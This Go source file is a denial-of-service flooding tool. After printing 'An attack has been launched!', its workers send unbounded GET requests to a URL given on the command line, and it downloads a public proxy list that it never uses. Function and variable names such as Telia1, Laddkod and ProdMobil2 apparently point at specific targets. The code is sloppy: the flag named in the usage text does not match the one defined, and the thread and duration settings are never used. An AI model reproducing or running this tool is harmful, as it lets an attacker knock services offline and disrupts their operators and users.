package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gookit/color"
	"github.com/valyala/fasthttp"
)

var host, err = os.Hostname()
var threads = 50000
var duration = 1

var timestamp = time.Now()
var timestampStr = timestamp.Format("2006-01-02 15:04:05")

var (
	target string
	limit  int

	LaddkoddFails   int
	TeliaFails      int
	ProdMobil2Fails int
	TotalRequests   int
)

func init() {
	flag.StringVar(&target, "url", "", "URL to send requests to")
	flag.IntVar(&limit, "limit", 1, "Limit on number of concurrent goroutines (0 for no limit)")

	flag.Parse()
	if target == "" {
		color.Println("[<fg=blue>INFO</>] Usage: To specify the target URL, run the program as follows:")
		color.Println("[<fg=blue>INFO</>] ./main.go -u <URL>")
		color.Println("[<fg=blue>INFO</>] Example: ./main.go -u https://example.com/")
		os.Exit(1)
	}
}

func main() {
	var wg sync.WaitGroup

	// Create a context that we can cancel
	ctx, cancel := context.WithCancel(context.Background())

	// Catch interrupt signal for graceful shutdown
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("Stopping...")
		cancel() // Cancel the context to stop all goroutines
	}()

	// Create a channel to send work items to the workers
	jobs := make(chan struct{}, limit) // Buffered channel with capacity equal to the limit

	color.Println("[<fg=blue>INFO</>] An attack has been launched!")
	color.Printf("[<fg=blue>INFO</>] Threads: %d\n", threads)
	color.Printf("[<fg=blue>INFO</>] Duration: %d seconds\n", duration)
	fmt.Println("")
	color.Printf("[<fg=blue>INFO</>] Time of launch: %v", timestampStr)
	fmt.Println("")
	time.Sleep(time.Millisecond * 3000)

	// Graceful Shutdown
	for i := 0; i < limit; i++ {
		wg.Add(1)
		go worker(ctx, &wg, jobs)
	}

	// Infinite loop to continuously send requests
	for {
		select {
		case <-ctx.Done():
			close(jobs) // Close the jobs channel to signal workers to exit
			wg.Wait()   // Wait for all workers to finish
			fmt.Println("All workers finished. Exiting.")
			return

		default:
			// Only send a new work item if there's room in the jobs channel
			select {
			case jobs <- struct{}{}: // Send a new work item to the workers
			default:
				// No room in the jobs channel; wait for a worker to become available
			}

		}
	}
}

var proxyList = fetchProxies("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")

func fetchProxies(uri string) []string {
	resp, err := http.Get(uri)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}
	proxyList := strings.Replace(string(body), "\r", "", -1)
	return strings.Split(proxyList, "\n")
}

func worker(ctx context.Context, wg *sync.WaitGroup, jobs chan struct{}) {
	var target = os.Args[2]

	defer wg.Done()
	for {
		select {
		case <-ctx.Done():
			return
		case <-jobs:
			go Telia1(target)
			go Laddkod(target)
			go ProdMobil2(target)

		}
	}
}

func Telia1(target string) {
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)
	req.Header.SetMethod("GET")
	req.SetRequestURI(target)
	fasthttp.Do(req, nil)

}

func Laddkod(target string) {
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)
	req.Header.SetMethod("GET")
	req.SetRequestURI(target)
	fasthttp.Do(req, nil)

}

func ProdMobil2(target string) {
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)
	req.Header.SetMethod("GET")
	req.SetRequestURI(target)
	fasthttp.Do(req, nil)

}
